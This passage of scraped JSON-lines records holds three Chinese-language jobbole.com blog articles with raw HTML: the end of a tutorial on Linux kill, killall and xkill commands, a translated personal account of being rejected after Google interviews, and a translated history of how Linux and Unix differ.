style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93252ae1561406647-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93252ae1561406647-1\"><span class=\"crayon-e\">pkill </span><span class=\"crayon-v\">fire</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>为了避免kill掉错误的进程，你应该用一下”pgrep -l [进程名]”列表来匹配进程名称。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/4bf646e70d32b860715b16e57e81ca38.png\" alt=\"\" width=\"396\" height=\"244\"></p>\n<h3><strong>Killall</strong></h3>\n<p>killall同样使用进程名替代PID，并且它会kill掉所有的同名进程。例如，如果你正在运行多个Firefox浏览器的实例，可以用命令把它们全部kill掉:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93252ae5659264217\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nkillall firefox</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93252ae5659264217-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93252ae5659264217-1\"><span class=\"crayon-e\">killall </span><span class=\"crayon-v\">firefox</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>在Gnome中，你可以使用这个命令重启Nautilus：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93252ae8127514074\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nkillall nautilus</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93252ae8127514074-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93252ae8127514074-1\"><span class=\"crayon-e\">killall </span><span class=\"crayon-v\">nautilus</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h3><strong>xkill</strong></h3>\n<p>xkill 是图形方式kill一个应用。当你在终端键入”xkill”，你的光标将立刻变成一个”十字”。你只需要做的是在不正常的应用上点击一下，它就会立刻kill掉这个应用。如果你经常用的话，你也可以添加一个<a href=\"http://www.maketecheasier.com/quick-tips/kill-unresponsive-application-in-ubuntu/\" target=\"_blank\" rel=\"external nofollow\">键盘快捷键来激活xkill</a>。</p>\n<h3><strong>结论</strong></h3>\n<p>当应用不正常而导致系统挂起的时候，人们往往重启计算机并且再一次开启所有的任务。而有了这些”kill”命令，你将能够更好的处理不正常的应用，从而避免导致系统崩溃。当你不想因一个不正常的进程而导致服务器宕机时，它尤其的有用。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113894\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113894votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113894\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/113894/", "url_obj_id": "6e3fcf5927147f4633e5566c0c847b94"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2015/10/ec8b7891ca44138c9a9a09ee180cf33b.jpg"], "title": "最终一轮面试被 Google 刷掉，这是一种什么样的体验？", "create_date": "2018/04/16 ·", "praise_num": 1, "fav_num": 2, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://medium.com/swlh/this-is-what-its-like-to-fail-your-interviews-at-google-83c772e6e654\">Jacob Levi Peterson</a>   译文出处：<a target=\"_blank\" href=\"https://36kr.com/p/5127560.html\">36氪-郝鹏程</a>   </div><blockquote><p>编者按：入职谷歌向来是可遇不可求的，只有那最为顶尖的万分之一的人才，才有资格收到谷歌的橄榄枝。因此，就算应聘谷歌失败了，也很正常。重要的是，从失败经历中不断学习，砥砺前行。本文作者 Jacob Levi Peterson 分享了自己与谷歌offer失之交臂的求职经历。</p></blockquote>\n<p>我应聘的是位于美国密歇根安娜堡分公司的 Associate Account Strategist，实质上是谷歌前线业务的销售岗，归谷歌 AdWords 部门管辖。</p>\n<p>整个招聘流程持续了大约一个月。如果顺利，应聘这个岗位要经历五轮面试。谷歌是在今年一月份给我发出面试邀请的。</p>\n<p>以前的招聘流程通常会更长，一个求职者要经历许多轮面试，通常为六个月或更长时间。 所以我没有什么可抱怨的，毕竟我的经历只有一个月。这也是我最终被刷掉的一点安慰。</p>\n<p>另外，这不是我第一次申请谷歌。 这也是我第二次经过朋友的推荐找工作。</p>\n<p>下面，就让我来聊聊整个面试体验的所感所想吧。</p>\n<h3>三轮电话面试</h3>\n<p>谷歌的招聘流程总体是高效的。但是，我经历了一个月无数次准备、学习面试经验、参与各轮面试，最终还是背谷歌拒绝了，这种感觉还是很不好受的。如果你也有过类似经历，那么真的很难过。但是，事情无疑会好转起来的。</p>\n<p>提交了简历和求职信，有个HR就找我做了电话面试。我通过了。一个礼拜以后，安娜堡那边的团队成员又给我做了两轮电话面试。</p>\n<p>由于保密协议，我不能具体透露面试的问题。下面聊聊面试给我的感受。</p>\n<p>HR在电话里面还是挺热情的，我感觉聊天进行得很顺利。后来，HR在后续与我沟通的时候，老是喜欢发各种emoji表情包，让我一度不知道要怎么回复他。不过，下一轮的电话面试的时间还是很早的，不用等太久。</p>\n<p>第二轮电话面试的时候，是安娜堡团队的人给我面的。当时我就感觉对方的语气明显没有第一轮电面的时候那么亲切。整轮面试让我感觉像是咨询公司常用的“压力面试”，HR不断质疑我、否定我的答案，问我各种问题。当时我几乎确定自己要被刷掉了。</p>\n<p>当天又进行了第三轮电话面试，是安娜堡团队的一名经理给我面的。这一次我感觉谈话氛围要友善很多。我给HR聊了自己关于安娜堡地区的一些看法和体验，HR似乎对我的话很满意，甚至还谈到他自己对这个地方的感受。</p>\n<h3>两轮现场面试</h3>\n<p>几天之后，我接到电话，受邀到谷歌公司参加面试。我欣喜若狂。</p>\n<p>面试之前，我做了无数次准备。到达密歇根以后，我感觉自己准备好了。</p>\n<p>谷歌的面试是分批进行的，在同一时间段，同一个岗位的不同求职者会集中在一起于同一天进行面试。谷歌告诉求职者们，要对其他求职者友善，不能针锋相对。潜台词就是：如果我们对所有人都满意，就会全部招进来。我认为这句话也可以这样理解：如果我们不要你，那是因为你不够优秀。岗位就在那里。但我们就是不想要你。直到面试之前我都在纠结谷歌到底是不是这个意思。</p>\n<p>面试那天我到得非常早，早到了40分钟。签到以后，我在等接待我的人。我跟其他应聘者有礼貌地闲聊。我发现我不是最早到的，心里有了些宽慰。</p>\n<p>接待人员到了以后，给我们每人发了一个颜色鲜艳的袋子，上面印有谷歌的标记。</p>\n<p>我们组带着进去了，穿过了一个接待区的门。这是我第一次去谷歌。谷歌公司跟我之前见过的任何公司都不一样，它的空间设计充满未来感、给人高效的感觉，非常棒。有很多灯光。我感觉这里就是我的家。虽然我的合同期很短，但是在那个瞬间我依然觉得，“我属于这里”。</p>\n<p>我们组的人逐渐走散，被分配至各个面试室。轮到我的面试室里面已经有人在面试了，于是接待人员跟我就开始闲聊起来。我跟他说，这个地方让我着迷，这是我第一次来谷歌。</p>\n<p>既然我们都要等，接待人员就带我带了游戏室。在游戏室门口，他指了指里面各种新奇的娱乐设备。我看到里面有乒乓球台，居然还有大雄鹿猎人（Big Buck Hunter），那是一款电子游戏室里才有的游戏。我还聊了聊乒乓球桌的标志性质对Google空间的作用，以及这种图像学如何更广泛地塑造了初创企业文化。房间里充满了各种各样的东西，但似乎没有Google员工。</p>\n<p>然后我们就回到了面试室。那里依然有人在用。于是我的接待人员就大声敲门，里面的人跟他说了以后他就马上走开了，快步走到了一个走廊里。然后我就一个人尴尬地站在面试室房间，手里拿着我的谷歌袋子，里面装着一个文件件、一个笔记本。我看着房间里的员工走出来，然后说了声抱歉，然后看了看接待人员那边的走廊，仿佛在表明“门不是我敲的”。</p>\n<p>我的第一个面试官来找我的时候，我就是这副摸样。他问我接待人员回来了没有，还问我是不是可以开始面试了。接待人员还没回来，我有点心慌，支支吾吾地说可以开始了。</p>\n<p>后来面试很快就开始了。面试进行的似乎还算顺利，很快就聊到了一些行为和假设性问题。我谈到了我的弟弟（小企业主）和他对谷歌产品的一些积极看法。然后面试就结束了。</p>\n<p>第二轮面试是我的未来上司给我面的。这一轮面试，我感到自己的肢体语言在面试当中给我加分了。从他们的言谈当中，我也感到他们很满意我的答案。</p>\n<p>我问他是否认为我符合岗位的要求（我在Youtube上看了两个前谷歌HR的经验之谈）。他说，他觉得我挺合适的，但也说“要看看最终情况如何”。他好像对这个表达不太满意，但是现在回想起来，我觉得还是应符合我的面试结果的（我最后毕竟被刷）。</p>\n<p>我很开心地离开面试室，觉得offer快到手了。遇到一个应聘者，他问我面试感觉如何。我一时间不知道说什么，最后有点迟疑地说：“还不错。”</p>\n<p>我怀疑有谷歌员工听到我的话了，于是我感到一阵紧张，害怕“打脸”。</p>\n<p>在等其他面试者的过程中，我和接待员聊了起来。我问他为什么喜欢到谷歌工作。他说：“也许主要是因为福利和工作、生活之间的平衡关系吧。”</p>\n<p>“不过，这份工作也有难处，比如给应聘者打电话，通知他们被刷掉了。”他接着说。</p>\n<p>于是我又感到一直不安。后来是游览环节，接待员领着我们逛了一圈公司，我们就回去了。</p>\n<h3>两天后，我被刷了。</h3>\n<p>两天以后，HR打电话给我说，我被刷掉了。我顿时感觉晴空霹雳。</p>\n<p>我也没法告诉你我到底哪里做的不好。谷歌从来不给反馈。我的忠告只能是：不断准备、不断学习、并试着让自己别那么尴尬（参考我的经历）。</p>\n<p>入职谷歌一直都是可遇不可求的事。Inc的数据显示，谷歌每年接收200万份简历，最终只招0.02%，淘汰比例是5000：1。</p>\n<p>电话里，HR对我说：“走到了这一步，不管最终结果如何，你都应该为自己感到万分自豪。”我觉得自己也许是自豪的。但是，无论如何这都是一场旷日持久的求职经历，而且其中不乏尴尬与窘迫的境遇。</p>\n<p>如果你最近也被谷歌刷了，我希望你能继续向前看，永远别对未来失去激情！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113568\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113568votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113568\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,Google,职场", "url": "http://blog.jobbole.com/113568/", "url_obj_id": "072156c0f2153402aab100fbc555a4b8"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/1d34dd467641215c527e32ede94fe494.jpg"], "title": "Linux vs. Unix：有什么不同？", "create_date": "2018/06/06 ·", "praise_num": 1, "fav_num": 3, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/5/differences-between-linux-and-unix\">Phil Estes</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9717-1.html\">Linux中国/MjSeven</a>   </div><blockquote><p>深入了解这两个有许多共同的传统和相同的目标的操作系统之间的不同。</p></blockquote>\n<p>如果你是位二、三十岁的软件开发人员，那么你已经成长在一个由 Linux 主导的世界。数十年来，它一直是数据中心的重要参与者，尽管很难找到明确的操作系统市场份额报告，但 Linux 的数据中心操作系统份额可能高达 70%，而 Windows 及其变体几乎涵盖了所有剩余的百分比。使用任何主流公共云服务的开发人员都可以预期目标系统会运行 Linux。近些年来，随着 Android 和基于 Linux 的嵌入式系统在智能手机、电视、汽车和其他设备中的应用，Linux 已经随处可见。</p>\n<p>即便如此，大多数软件开发人员，甚至是那些在这场历史悠久的 “Linux 革命”中长大的软件开发人员，也都听过说 Unix。它听起来与 Linux 相似，你可能已经听到人们互换使用这些术语。或者你也许听说过 Linux 被称为“类 Unix ”操作系统。</p>\n<p>那么，Unix 是什么？漫画喜欢将它画成巫师一样留着“灰胡子”的形象，坐在发光的绿色屏幕后面，写着 C 代码和 shell 脚本，由老式的、滴灌的咖啡提供动力。但是，Unix 的历史比上世纪 70 年代那些留着胡子的 C 程序员要丰富得多。虽然详细介绍 Unix 历史和 “Unix 与 Linux” 比较的文章比比皆是，但本文将提供高级背景和列出这些互补世界之间的主要区别。</p>\n<h3 id=\"toc_1\">Unix 的起源</h3>\n<p>Unix 的历史始于 20 世纪 60 年代后期的 AT&amp;T 贝尔实验室，有一小组程序员希望为 PDP-7 编写一个多任务、多用户操作系统。这个贝尔实验室研究机构的团队中最著名的两名成员是 Ken Thompson 和 Dennis Ritchie。尽管 Unix 的许多概念都是其前身（<a href=\"https://en.wikipedia.org/wiki/Multics\">Multics</a>）的衍生物，但 Unix 团队早在 70 年代就决定用 C 语言重写这个小型操作系统，这是将 Unix 与其他操作系统区分开来的原因。当时，操作系统很少，更不要说可移植的操作系统。相反，由于它们的设计和底层语言的本质，操作系统与他们所编写的硬件平台紧密相关。而通过 C 语言重构 Unix、Unix 现在可以移植到许多硬件体系结构中。</p>\n<p>除了这种新的可移植性，之所以使得 Unix 迅速扩展到贝尔实验室以外的其他研究和学术机构甚至商业用途，是因为操作系统设计原则的几个关键点吸引了用户和程序员们。首先是 Ken Thompson 的 <a href=\"https://en.wikipedia.org/wiki/Unix_philosophy\">Unix 哲学</a>成为模块化软件设计和计算的强大模型。Unix 哲学推荐使用小型的、专用的程序组合起来完成复杂的整体任务。由于 Unix 是围绕文件和管道设计的，因此这种“管道”模式的输入和输出程序的组合成一组线性的输入操作，现在仍然流行。事实上，目前的云功能即服务（FaaS）或无服务器计算模型要归功于 Unix 哲学的许多传统。</p>\n<h3 id=\"toc_2\">快速增长和竞争</h3>\n<p>到 70 年代末和 80 年代，Unix 成为了一个操作系统家族的起源，它遍及了研究和学术机构以及日益增长的商业 Unix 操作系统业务领域。Unix 不是开源软件，Unix 源代码可以通过与它的所有者 AT&amp;T 达成协议来获得许可。第一个已知的软件许可证于 1975 年出售给伊利诺伊大学University of Illinois。</p>\n<p>Unix 在学术界迅速发展，在 Ken Thompson 在上世纪 70 年代的学术假期间，伯克利成为一个重要的活动中心。通过在伯克利的各种有关 Unix 的活动，Unix 软件的一种新的交付方式诞生了：伯克利软件发行版Berkeley Software Distribution（BSD）。最初，BSD 不是 AT&amp;T Unix 的替代品，而是一种添加类似于附加软件和功能。在 1979 年， 2BSD（第二版伯克利软件发行版）出现时，伯克利研究生 Bill Joy 已经添加了现在非常有名的程序，例如 <code>vi</code> 和 C shell（<code>/bin/csh</code>）。</p>\n<p>除了成为 Unix 家族中最受欢迎的分支之一的 BSD 之外，Unix 的商业产品的爆发贯穿了二十世纪八、九十年代，其中包括 HP-UX、IBM 的 AIX、 Sun 的 Solaris、 Sequent 和 Xenix 等。随着分支从根源头发展壮大，“<a href=\"https://en.wikipedia.org/wiki/Unix_wars\">Unix 战争</a>”开始了，标准化成为社区的新焦点。POSIX 标准诞生于 1988 年，其他标准化后续工作也开始通过 The Open Group 在 90 年代到来。</p>\n<p>在此期间，AT&amp;T 和 Sun 发布了 System V Release 4（SVR4），许多商业供应商都采用了这一版本。另外，BSD 系列操作系统多年来一直在增长，最终一些开源的变体在现在熟悉的 <a href=\"https://en.wikipedia.org/wiki/BSD_licenses\">BSD许可证</a>下发布。这包括 FreeBSD、 OpenBSD 和 NetBSD，每个在 Unix 服务器行业的目标市场略有不同。这些 Unix 变体今天仍然有一些在使用，尽管人们已经看到它们的服务器市场份额缩小到个位数字（或更低）。在当今的所有 Unix 系统中，BSD 可能拥有最大的安装基数。另外，每台 Apple Mac 硬件设备从历史的角度看都可以算做是 BSD ，这是因为 OS X（现在是 macOS）操作系统是 BSD 衍生产品。</p>\n<p>虽然 Unix 的全部历史及其学术和商业变体可能需要更多的篇幅，但为了我们文章的重点，让我们来讨论 Linux 的兴起。</p>\n<h3 id=\"toc_3\">进入 Linux</h3>\n<p>今天我们所说的 Linux 操作系统实际上是 90 年代初期的两个努力的结合。Richard Stallman 希望创建一个真正的自由而开放源代码的专有 Unix 系统的替代品。他正在以 GNU 的名义开发实用程序和程序，这是一种递归的说法，意思是“GNU‘s not Unix!”。虽然当时有一个内核项目正在进行，但事实证明这是一件很困难的事情，而且没有内核，自由和开源操作系统的梦想无法实现。而这是 Linus Torvald 的工作 —— 生产出一种可工作和可行的内核，他称之为 Linux — 它将整个操作系统带入了生活。鉴于 Linus 使用了几个 GNU 工具（例如 GNU 编译器集合，即 <a href=\"https://en.wikipedia.org/wiki/GNU_Compiler_Collection\">GCC</a>），GNU 工具和 Linux 内核的结合是完美的搭配。</p>\n<p>Linux 发行版采用了 GNU 的组件、Linux 内核、MIT 的 X-Windows GUI 以及可以在开源 BSD 许可下使用的其它 BSD 组件。像 Slackware 和 Red Hat 这样的发行版早期的流行给了 20 世纪 90 年代的“普通 PC 用户”一个进入 Linux 操作系统的机会，并且让他们在工作和学术生活中可以使用许多 Unix 系统特有的功能和实用程序。</p>\n<p>由于所有 Linux 组件都是自由和开放的源代码，任何人都可以通过一些努力来创建一个 Linux 发行版，所以不久后发行版的总数达到了数百个。今天，<a href=\"https://distrowatch.com/\">distrowatch.com</a> 列出了 312 种各种形式的独特的 Linux 发行版。当然，许多开发人员通过云提供商或使用流行的免费发行版来使用 Linux，如 Fedora、 Canonical 的 Ubuntu、 Debian、 Arch Linux、 Gentoo 和许多其它变体。随着包括 IBM 在内的许多企业从专有 Unix 迁移到 Linux 上并提供了中间件和软件解决方案，商用 Linux 产品在自由和开源组件之上提供支持变得可行。红帽公司围绕 Red Hat Enterprise Linux（红帽企业版 Linux） 建立了商业支持模式，德国供应商 SUSE 使用 SUSE Linux Enterprise Server（SLES）也提供了这种模式。</p>\n<h3 id=\"toc_4\">比较 Unix 和 Linux</h3>\n<p>到目前为止，我们已经了解了 Unix 的历史以及 Linux 的兴起，以及 GNU/自由软件基金会对 Unix 的自由和开源替代品的支持。让我们来看看这两个操作系统之间的差异，它们有许多共同的传统和许多相同的目标。</p>\n<p>从用户体验角度来看，两者差不多！Linux 的很大吸引力在于操作系统在许多硬件体系结构（包括现代 PC）上的可用性以及类似使用 Unix 系统管理员和用户熟悉的工具的能力。</p>\n<p>由于 POSIX 的标准和合规性，在 Unix 上编写的软件可以针对 Linux 操作系统进行编译，通常只有少量的移植工作量。在很多情况下，Shell 脚本可以在 Linux 上直接使用。虽然一些工具在 Unix 和 Linux 之间有着略微不同的标志或命令行选项，但许多工具在两者上都是相同的。</p>\n<p>一方面要注意的是，macOS 硬件和操作系统作为主要针对 Linux 的开发平台的流行可能归因于类 BSD 的 macOS 操作系统。许多用于 Linux 系统的工具和脚本可以在 macOS 终端内轻松工作。Linux 上的许多开源软件组件都可以通过 <a href=\"https://brew.sh/\">Homebrew</a> 等工具轻松获得。</p>\n<p>Linux 和 Unix 之间的其他差异主要与许可模式有关：开源与专有许可软件。另外，在 Unix 发行版中缺少一个影响软件和硬件供应商的通用内核。对于 Linux，供应商可以为特定的硬件设备创建设备驱动程序，并期望在合理的范围内它可以在大多数发行版上运行。由于 Unix 家族的商业和学术分支，供应商可能必须为 Unix 的变体编写不同的驱动程序，并且需要许可和其他相关的权限才能访问 SDK 或软件的分发模型，以跨越多个二进制设备驱动程序的 Unix 变体。</p>\n<p>随着这两个社区在过去十年中的成熟，Linux 的许多优点已经在 Unix 世界中被采用。当开发人员需要来自不属于 Unix 的 GNU 程序的功能时，许多 GNU 实用程序可作为 Unix 系统的附件提供。例如，IBM 的 AIX 为 Linux 应用程序提供了一个 AIX Toolbox，其中包含数百个 GNU 软件包（如 Bash、 GCC、 OpenLDAP 和许多其他软件包），这些软件包可添加到 AIX 安装包中以简化 Linux 和基于 Unix 的 AIX 系统之间的过渡。</p>\n<p>专有的 Unix 仍然活着而且还不错，许多主要供应商承诺支持其当前版本，直到 2020 年。不言而喻，Unix 还会在可预见的将来一直出现。此外，Unix 的 BSD 分支是开源的，而 NetBSD、 OpenBSD 和 FreeBSD 都有强大的用户基础和开源社区，它们可能不像 Linux 那样显眼或活跃，但在最近的服务器报告中，在 Web 服务等领域它们远高于专有 Unix 的数量。</p>\n<p>Linux 已经显示出其超越 Unix 的显著优势在于其在大量硬件平台和设备上的可用性。树莓派Raspberry Pi受到业余爱好者的欢迎，它是由 Linux 驱动的，为运行 Linux 的各种物联网设备打开了大门。我们已经提到了 Android 设备，汽车（包括 Automotive Grade Linux）和智能电视，其中 Linux 占有巨大的市场份额。这个星球上的每个云提供商都提供运行 Linux 的虚拟服务器，而且当今许多最受欢迎的原生云架构都是基于 Linux 的，无论你是在谈论容器运行时还是 Kubernetes，或者是许多正在流行的无服务器平台。</p>\n<p>其中一个最显著的代表 Linux 的优势是近年来微软的转变。如果你十年前告诉软件开发人员，Windows 操作系统将在 2016 年“运行 Linux”，他们中的大多数人会歇斯底里地大笑。 但是 Windows Linux 子系统（WSL）的存在和普及，以及最近宣布的诸如 Docker 的 Windows 移植版，包括 LCOW（Windows 上的 Linux 容器）支持等功能都证明了 Linux 在整个软件世界中所产生的影响 —— 而且显然还会继续存在。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114089\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114089votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114089\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/114089/", "url_obj_id": "93cf887d22a88cdab82dc81d187d23a1"}
